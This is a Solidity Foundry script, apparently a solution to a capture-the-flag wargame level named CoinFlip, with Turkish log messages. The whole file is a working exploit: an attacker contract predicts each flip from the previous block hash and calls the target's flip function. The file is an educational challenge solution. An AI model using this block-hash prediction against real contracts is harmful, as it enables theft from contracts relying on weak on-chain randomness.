// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "src/CoinFlip.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract Coin {
    CoinFlip public coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        coinFlip = _coinFlip;
    }

    function attack() public {
        uint256 currentBlockValue = uint256(blockhash(block.number - 1));
        console.log("Son block degeri:", block.number);
        console.log("Son block hash (uint256):", currentBlockValue);

        uint256 flip = currentBlockValue / FACTOR;
        bool side = flip == 1 ? true : false;

        bool dogruMu = coinFlip.flip(side);
    }
}

contract CoinFlipSolution is Script {
    // Fallout public fallout = Fallout(payable(0x72D99E83E8165A50077e0a0F7c09d66E2b511085));
    CoinFlip public coinFlip = CoinFlip(0xC7a091e37fAbF626603869a48CeeEB08be09d41a);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Coin a = new Coin(coinFlip);
        a.attack();
        console.log("Kazanilan: %s", coinFlip.consecutiveWins());

        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
